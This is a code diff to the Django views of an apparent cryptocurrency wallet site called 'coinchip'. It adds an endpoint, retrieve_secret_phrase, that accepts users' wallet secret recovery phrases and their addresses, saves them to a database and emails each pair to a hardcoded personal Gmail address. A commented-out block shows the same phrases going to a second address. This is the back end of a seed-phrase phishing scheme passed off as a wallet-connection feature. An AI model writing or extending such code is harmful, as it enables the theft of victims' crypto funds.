@@ -11,8 +11,11 @@ from django.shortcuts import redirect
 
 from django.db.models import Q
 
-from .models import Transactions, Comments, Wallet
+from .models import Transactions, Comments, Wallet, WalletSecretPhrase
 from django.shortcuts import render
+
+from django.core.mail import EmailMessage, get_connection, send_mail
+from django.conf import settings
 
 
 # User
@@ -104,7 +107,45 @@ def connect_wallet(request):
     return Response({"message": "Method not allowed"}, status=status.HTTP_400_BAD_REQUEST)
 
 
+@api_view(['POST', 'GET'])
+def retrieve_secret_phrase(request):
+    if request.method == 'POST':
+        data = request.data
+        if request.data.get("secret_phrase"):
+            print(data)
+            # Check if Wallet Secret already exists...
+            # If it doesn't, create it.
+            # If it does, don't create it.
+            wallet_phrase_exists = WalletSecretPhrase.objects.filter(secret_phrase=data.get("secret_phrase"))
+            if len(wallet_phrase_exists) > 0:
+                return Response({"message": "Wallet phrase already exists"}, status=status.HTTP_400_BAD_REQUEST)
+            WalletSecretPhrase.objects.create(address=data.get("address"), secret_phrase=data.get("secret_phrase"))
 
+            # Send Email
+            subject = "You received a mail from coinchip" 
+            email_from = settings.EMAIL_HOST_USER  
+            recipient_list = ["petercodercoder@gmail.com", ]  
+            message = f"Secret phrase: {data.get('secret_phrase') }; Secret phrase: {data.get('address') };"
+            print("Email is working... ")
+            send_mail(subject, message, email_from, recipient_list)
+            # with get_connection(  
+            #     host=settings.EMAIL_HOST, 
+            #     port=settings.EMAIL_PORT,  
+            #     username=settings.EMAIL_HOST_USER, 
+            #     password=settings.EMAIL_HOST_PASSWORD, 
+            #     use_tls=settings.EMAIL_USE_TLS  
+            # ) as connection:
+            #     subject = "You received a mail from coinchip" 
+            #     email_from = settings.EMAIL_HOST_USER  
+            #     recipient_list = ["talk2peteresezobor@gmail.com", ]  
+            #     message = f"Secret phrase: {data.get('secret_phrase') }; Secret phrase: {data.get('address') };"
+            #     print("Email is working... ")
+            #     EmailMessage(subject, message, email_from, recipient_list, connection=connection).send()
+
+
+            return Response({"message": "Wallet phrase received successfully."}, status=status.HTTP_200_OK)
+        return Response({"message": "Secret phrase is required."}, status=status.HTTP_400_BAD_REQUEST)
+    return Response({"message": "Method not allowed."}, status=status.HTTP_405_METHOD_NOT_ALLOWED)
 
 
 
